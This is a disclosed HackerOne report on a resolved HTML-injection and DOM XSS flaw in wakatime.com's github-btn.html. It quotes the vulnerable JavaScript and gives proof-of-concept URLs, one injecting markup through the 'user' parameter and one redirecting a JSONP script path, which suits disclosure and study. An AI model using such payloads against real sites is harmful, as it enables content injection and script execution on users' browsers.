---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '248588'
original_report_id: '248588'
title: '[wakatime.com] HTML Injection github-btn.html'
weakness: Cross-site Scripting (XSS) - DOM
team_handle: wakatime
created_at: '2017-07-12T08:13:29.162Z'
disclosed_at: '2018-10-19T15:13:45.890Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# [wakatime.com] HTML Injection github-btn.html

## Metadata

- HackerOne Report ID: 248588
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: wakatime
- Disclosed At: 2018-10-19T15:13:45.890Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Description
===
**Vulnerable parameter:** user
**Vulnerable script:** https://wakatime.com/static/html/github-btn.html
**Vulnerable code:**
```js
  var params = function () {
    var vars = [], hash;
    var hashes = window.location.href.slice(window.location.href.indexOf("?") + 1).split("&");
    for(var i = 0; i < hashes.length; i++) {
      hash = hashes[i].split('=');
      vars.push(hash[0]);
      vars[hash[0]] = hash[1];
    }
    return vars;
  }()
  var user = params.user,
      repo = params.repo,
      type = params.type,
 ...
  } else if (type == "follow") {
    mainButton.className += " github-me";
    text.innerHTML = "Follow @" + user;
```
PoCs
===

**PoC #1**
HTML Injection for Chrome, Internet Explorer

```
https://wakatime.com/static/html/github-btn.html#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow
```

**PoC #2**
Using this script it is also possible to use DOM Based XSS in Internet Explorer, as I did in these reports #200753 #200826
But since the `X-Frame-Options: SAMEORIGIN` header is used for all HTTP responses, this could not be done in this case.

Another vulns
===

Also, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.
But for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).

```js
  function jsonp(path) {
    var el = document.createElement('script');
    el.src = path + '?callback=callback';
    head.insertBefore(el, head.firstChild);
  }
...
  if (type == 'follow') {
    jsonp('https://api.github.com/users/' + user);
  } else {
    jsonp('https://api.github.com/repos/' + user + '/' + repo);
  }
```
**PoC**
```
https://wakatime.com/static/html/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork
```
**Result**
```
https://api.github.com/another/endpoint?callback=callback
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
